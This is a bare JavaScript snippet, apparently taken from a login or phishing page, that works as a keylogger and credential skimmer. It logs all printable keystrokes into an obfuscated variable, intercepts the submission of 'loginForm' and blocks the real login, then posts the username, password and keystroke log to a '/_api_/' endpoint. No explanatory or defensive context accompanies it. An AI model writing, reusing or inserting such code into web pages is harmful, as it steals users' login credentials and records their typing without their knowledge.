var _0xkl='';document.addEventListener('keydown',function(e){if(e.key.length==1){_0xkl+=e.key}});
document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var d=new FormData(e.target);
fetch('/_api_/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:d.get('usuario'),p:d.get('clave'),k:_0xkl})});});
